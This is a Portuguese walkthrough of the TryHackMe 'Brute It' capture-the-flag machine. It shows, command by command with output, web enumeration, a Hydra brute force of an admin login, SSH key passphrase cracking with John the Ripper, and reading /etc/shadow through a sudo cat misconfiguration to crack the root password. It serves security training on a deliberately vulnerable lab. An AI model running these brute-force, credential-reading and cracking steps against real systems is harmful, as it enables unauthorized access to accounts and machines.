---
title: "TryHackMe - Brute It"
published: 2025-09-06
description: "Walkthrough da máquina Brute It do TryHackMe, focando em brute force com Hydra, quebra de senha de chave SSH com John the Ripper e escalação de privilégios via sudo cat."
image: "https://miro.medium.com/v2/resize:fit:965/1*Ltim-vhbt-0OX6ZZ7uY62g.png"
tags: ["tryhackme", "ctf", "walkthrough", "nmap", "gobuster", "hydra", "ssh", "john", "privesc", "sudo"]
category: "TryHackMe"
draft: false
---

# TryHackMe - Brute It

:::note
**Resumo da Máquina**
- **IP:** `10.201.48.203`
- **SO:** Ubuntu Linux
- **Vetor de Ataque:** Brute force em painel de administração web, revelando uma chave SSH privada. A senha da chave foi quebrada, e a escalação de privilégios foi obtida explorando uma permissão inadequada no `sudo` que permitia a leitura do arquivo `/etc/shadow`.
:::

**Tags:** `#ctf` `#walkthrough` `#tryhackme` `#nmap` `#gobuster` `#hydra` `#ssh` `#john` `#privesc` `#sudo`

## 1. Reconhecimento e Enumeração

O primeiro passo, como sempre, é realizar um reconhecimento completo do alvo para identificar vetores de ataque em potencial.

### 1.1. Varredura com Nmap
Utilizei o **Nmap** com a flag `-sV` para detectar as versões dos serviços em execução nas portas abertas.

```bash
nmap -sV 10.201.48.203
```

**Resultado:**
```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 18:40 -03
Nmap scan report for 10.201.48.203
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

:::tip
**Pontos de Interesse Encontrados:**
- **Porta 22:** SSH (`OpenSSH 7.6p1`)
- **Porta 80:** HTTP (`Apache httpd 2.4.29`)
:::

### 1.2. Enumeração de Diretórios Web
Com um servidor Apache rodando, o próximo passo foi buscar por diretórios e páginas ocultas. Utilizei o **GoBuster** para essa tarefa.

```bash
gobuster dir -u http://10.201.48.203/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

O GoBuster rapidamente identificou um diretório promissor: `/admin`.

## 2. Acesso Inicial

A fase de acesso inicial focou em explorar o painel de administração encontrado na porta 80.

### 2.1. Análise do Painel de Administração
Ao acessar `http://10.201.48.203/admin`, encontrei uma página de login. Inspecionando o código-fonte da página, uma dica crucial foi revelada em um comentário HTML.

Isso confirmou dois nomes de usuário em potencial: `john` e `admin`. O formulário indicava que `admin` era o usuário do painel.

### 2.2. Brute Force com Hydra
Sabendo o nome de usuário (`admin`) e a URL do formulário, realizei um ataque de força bruta com o **Hydra** para descobrir a senha.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.201.48.203 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```

**Resultado:**
```text
[80][http-post-form] host: 10.201.48.203   login: admin   password: xavier
```

:::important
As credenciais do painel de administração foram descobertas: `admin:xavier`
:::

### 2.3. Obtendo e Quebrando a Chave SSH
Após o login no painel com as credenciais encontradas, a página revelou uma chave SSH privada, provavelmente pertencente ao usuário `john`. A chave estava protegida por uma senha (passphrase).

Para obter acesso, precisei quebrar essa senha usando o **John the Ripper**.

1. **Salvar a chave** em um arquivo chamado `id_rsa`.
2. **Extrair o hash** da chave usando `ssh2john`.
   ```bash
   ssh2john id_rsa > hash.txt
   ```
3. **Quebrar o hash** com o `john` e a wordlist `rockyou.txt`.
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   ```
   **Resultado:**
   ```text
   Using default input encoding: UTF-8
   Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
   ...
   rockinroll       (id_rsa)       
   ...
   Session completed.
   ```

:::important
A senha da chave SSH de John foi descoberta: `rockinroll`
:::

### 2.4. Obtendo Acesso e Capturando a Flag do Usuário
Com a chave privada (`id_rsa`), o nome de usuário (`john`) e a senha da chave (`rockinroll`), o acesso via SSH foi possível.

1. Ajustar as permissões da chave privada.
   ```bash
   chmod 600 id_rsa
   ```
2. Conectar-se via SSH.
   ```bash
   ssh -i id_rsa john@10.201.48.203
   ```

Após inserir a senha `rockinroll`, o acesso ao shell como usuário `john` foi concedido. Com isso, foi simples capturar a flag do usuário.

```bash
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
```

:::important
**user.txt:** `thm{...user_flag...}`
:::

## 3. Escalação de Privilégios

Com acesso como `john`, o próximo passo foi escalar os privilégios para `root`.

### 3.1. Identificando o Vetor (`sudo`)
A primeira e mais importante verificação foi checar as permissões `sudo` do usuário `john`.

```bash
john@bruteit:~$ sudo -l
```

**Resultado:**
```text
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

Esta foi a descoberta crítica. O usuário `john` pode executar o comando `/bin/cat` como `root` e sem precisar de senha. Isso permite a leitura de qualquer arquivo no sistema.

### 3.2. Exploração e Quebra da Senha Root
A estratégia foi usar essa permissão para ler o arquivo `/etc/shadow`, que contém os hashes das senhas de todos os usuários.

1. Ler o conteúdo do `/etc/shadow` como `root`.
   ```bash
   sudo cat /etc/shadow
   ```
2. Copiar o hash da senha do usuário root.
   ```text
   root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
   ```
3. Salvar o hash em um arquivo (`hash_root.txt`) na máquina local e usar o **John the Ripper** para quebrá-lo.
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt
   ```
   **Resultado:**
   ```text
   ...
   football         (root)         
   ...
   Session completed.
   ```

:::important
A senha do usuário root foi descoberta: `football`
:::

### 3.3. Obtendo Acesso Root e Capturando a Flag
Com a senha do root em mãos, bastou usar o comando `su` para se tornar o superusuário.

```bash
john@bruteit:~$ su -
Password: 
root@bruteit:~# 
```

Após digitar a senha `football`, o acesso `root` foi obtido. A etapa final foi ler a flag.

```bash
root@bruteit:~# cat /root/root.txt
```

:::important
**root.txt:** `thm{...user_flag...}`
:::
